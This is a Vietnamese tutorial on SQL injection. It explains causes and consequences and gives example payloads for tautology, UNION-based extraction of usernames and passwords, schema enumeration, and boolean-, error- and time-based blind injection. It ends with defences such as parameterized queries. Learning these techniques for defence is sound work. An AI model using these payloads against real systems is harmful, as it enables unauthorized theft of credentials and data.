# SQL INJECTION
### 1.SQL Injection là gì?
+ SQL Injection là một kỹ thuật tấn công cho phép kẻ tấn công chèn mã SQL vào dữ liệu gửi đến máy chủ.
+ Cuối cùng được thực thi mã trên máy chủ cơ sở dữ liệu
### 2.Nguyên nhân chính của lỗ hổng SQL Injection là gì?
+ Do dữ liệu đầu vào từ người dùng không được kiểm tra kỹ lưỡng
+ Sử dụng các câu lệnh SQL động,thao tác nối dữ liệu người dùng với mã lệnh SQL gốc
### 3.Hậu quả của SQL Injection
+ Làm lộ dữ liệu của database
+ Xóa đi dữ liệu nhạy cảm quan trọng của hệ thống
+ Thay đổi dữ liệu nhạy cảm của hệ thống
+ Có thể kiểm soát máy chủ cơ sở dữ liệu và thực thi lệnh theo ý muốn
### 4.Các dạng tấn công SQL Injection:
#### 1.Retrieving hidden data: 
##### Có thể sửa câu truy vấn để trả về kết quả bổ sung
Ví dụ : input đầu vào là @query = 'john'
Ở đây câu truy vấn sẽ SELECT đến bảng users để lấy dữ liệu có username = 'john'
```Mysql
SELECT * FROM users WHERE username = @query;
```
Nhưng ở đây chúng ta không biết trong bảng users có những username nào.Vì thế chúng ta cần sửa lại input đầu vào để câu truy vấn luôn đúng.@query = 'john' or 1 = 1 --  
```MySQL
SELECT * FROM users WHERE username = 'john' or 1 = 1 -- ;
```
Kết quả trả về sẽ là tất cả dữ liệu của bảng users
#### 2.Retrieving data from other database tables: 
##### Kiểu tấn công này liên quan đến sử dụng UNION để kết hợp 2 hay nhiều câu lệnh SELECT.
Để câu truy vấn UNION hoạt động thì phải đáp ứng được 2 yêu cầu:

+ Các câu truy vấn riêng phải cùng có số cột.
+ Các kiểu dữ liệu trong mỗi cột phải tương thích với nhau.

Ví dụ : input đầu vào là @query = '123'
```MySQL
SELECT name,type FROM category WHERE id = @query;
```
Ở đây mình muốn lấy username,password từ bảng `users`,mình cần check trước là số lượng cột ở câu truy vấn trước.@query có thể:
```MySQL
'123' UNION SELECT NULL,NULL--
'123' UNION SELECT NULL,NULL,NULL--
'123' UNION SELECT NULL,NULL,NULL,NULL--
etc.
```
Ở đây mình dùng `NULL` vì nó có thể chuyển đổi thành mọi kiểu dữ liệu.Mình sẽ thử lần lượt các câu query cho đến khi server không báo lỗi.
```MySQL
SELECT name,type FROM category WHERE id = '123' UNION SELECT NULL,NULL--;
```
Bây giờ mình cần kiểm tra dữ liệu của từng cột.@query có thể:
```MySQL
'123' UNION SELECT 'x',NULL--
'123' UNION SELECT NULL,'x'--
'123' UNION SELECT 'x','y'--
etc.
```
Sau khi xác định được kiểu dữ liệu thì bây giờ mình cần truy vấn lấy dữ liệu ở bảng `users`
```MySQL
SELECT name,type FROM category WHERE id = '123' UNION SELECT username,password FROM users--;
```
#### 3.Examining the database:
##### Kiểu tấn công này sẽ lấy được phiên bản và cấu trúc cơ sở dữ liệu
Truy vấn đến `information_schema.tables` để liệt kê các bảng trong cơ sở dữ liệu
```MySQL
SELECT * FROM information_schema.tables
```
Sau đó chúng ta có thể truy vấn `information_schema.columns`để xem các cột dữ liệu của chúng
```MySQL
SELECT * FROM information_schema.columns WHERE table_name='users'
```
Cuối cùng ta có thể truy vẫn đến từng giá trị của bảng
```MySQL
SELECT user_abcd,pasword_efgh FROM users
```
Mình thấy hay kết hợp với câu truy vấn `UNION`
#### 4.Blind SQL Injection:
##### Kiểu tấn công này sẽ không trả về kết quả của câu truy vấn đưa vào
###### a. Response trả về giữa câu query Boolean là khác nhau
Ví dụ:
```MySQL
SELECT * FROM users WHERE username=@query;
-- Nếu câu truy vấn đúng sẽ in ra giao diện "successfully"
-- Ngược lại sẽ không in gì
```
Bây giờ mình thử xâm nhập:
```MySQL
SELECT * FROM users WHERE username='admin';
-- hiện thị "successfully"
SELECT * FROM users WHERE username='admin' AND 1 = 2;
-- không hiện thị
SELECT * FROM users WHERE username='admin' AND 1=1;
-- hiện thị "successfully"
```
Gỉa sử mình biết trong cơ sở dữ liệu có bảng `users` và có username = 'admin',mình cần tìm ra password.
Ban đầu mình cần tìm ra độ dài của password @length = 1:
```MySQL
SELECT * FROM users WHERE username='admin' 
AND (select 'pwd' from users where username = 'admin' AND LENGTH(password)>@length)='pwd';
-- hiện thị "successfully"
```
Mình cần tăng @length đến khi nào không hiện thị `successfully`,giả sử length =10 bây giờ mình cần tìm password bằng cách cắt và so sánh từng kí tự 1.
```MySQL
SELECT * FROM users WHERE username='admin' 
AND (select SUBSTRING(password,1,1) from users where username = 'admin')='a';
-- không hiện thị
-- Chỗ này mình cần thay đổi giá trị 'a' đến khi hiện thị
```
Mình dùng `Bruteforce` để gửi các payload.Ở đây có 2 payload là vị trí của từng ký tự và payload để so sánh (a,b) 
```MySQL
SELECT * FROM users WHERE username='admin' 
AND (select SUBSTRING(password,$a$,1) from users where username = 'admin')='$b$';
```
Chạy xong sẽ tìm được password!
###### b.Error based: Khác với dạng trên,thì ở dạng này thì response trả về giữa các câu query Boolean không khác nhau.Nhưng mà nó trả về các exception,message lỗi từ câu lệnh SQL:
**MYSQL**
Ví dụ:
```MySQL
select * from users where username = 'admin' and (select case when (1=1) then 1/0 else 's' end)='s';
-- > điều kiện 1 = 1 đúng thì câu này sẽ thực hiện 1/0 sẽ gây ra lỗi chia cho số 0
select * from users where username = 'admin' and (select case when (1=2) then 1/0 else 's' end)='s';
-- > điều kện 1 = 2 là sai thì câu lệnh sau AND sẽ trả về true    
```
Sau đó chúng ta có thể truy vết dữ liệu như ở dạng a ở trên.
##### c.Time-based: gửi truy vấn đến database làm cho database đợi(vài giây) trước khi có thể hoạt động:
Cách chạy thời gian trễ cho từng database
![img](https://scontent.xx.fbcdn.net/v/t1.15752-9/329032973_3491653274396858_6283571348762962612_n.png?_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=wieAw4ChtbAAX9UsWaM&_nc_oc=AQn6HIN5BxM2LCpAmznCGP-rqAabZSj_Xk0CaO3z-li9cLk7Xb9VsX2ZfHsOzINxQhxOPxAYmblvAKZxxq8bsDm1&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTfBlETBpzedGQy5Si28ieZgiFidTfMM-f5PekpChKLiw&oe=640E4E89)
Ví dụ :
**MYSQL**
```MySQL
SELECT * FROM app.user where id =1 and case when(true) then sleep(5) else sleep(0) end;
``` 
![img](https://scontent.xx.fbcdn.net/v/t1.15752-9/330429557_698290495104032_2516872502378872048_n.png?_nc_cat=103&ccb=1-7&_nc_sid=aee45a&_nc_ohc=0QVs8XkUDysAX9HLuw9&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdT1H3chendAiKeLqahKYPjrPL1Dy68fld0sn2aObxvXiw&oe=640E99FE)
Dạng này kết hợp với các câu truy vấn Boolean để truy vết dữ liệu
#### 5.Out of band SQL Injection:
+ Kẻ tấn công sẽ tạo ra câu lệnh SQL,lệnh có thể kích hoạt hệ thống cơ sở dữ liệu để tạo kết nối với máy chủ bên ngoài mà kẻ tấn công kiểm soát

### 5.Cách phòng chống SQL Injection:
+ **Lọc dữ liệu từ người dùng:** Ta sử dụng filter để lọc các ký tự đặc biệt(;') hoặc các từ khóa(UNION,SELECT)
+ **Không hiện thị exception,message lỗi:** Hacker có thể dự vào message lỗi để tìm ra cấu trúc dữ liệu
+ **Mã hóa dữ liệu trong database:** Điều này làm cho hacker tìm được,những khó để sử dụng
+ **Tham số hóa truy vấn:** Cấu trúc của câu truy vấn và truyền các tham số giá trị được tách biệt
Ví dụ:
**MYSQL**
Truy vấn cách thông thường:
```MySQL
    SELECT * FROM Users WHERE Username = ' + username + ' AND Password = ' + password + ';
    -- > Ở đây người hacker có thể nhập username = admin' or 1=1; -- để lấy hết thông tin của người dùng
```
Nếu sử dụng tham số hóa:
```MySQl
    sqlQuery = SELECT * FROM Users WHERE Username =? AND Password =?';
    parameters.add("Username", username)
    parameters.add("Password", password)
```
Ở đây người hacker có thể nhập username = admin" or 1=1; -- và password = 123456
Khi truy vấn nó sẽ hiểu là sẽ truy vấn đến Username có value là admin" or 1=1; -- và Password = 123456












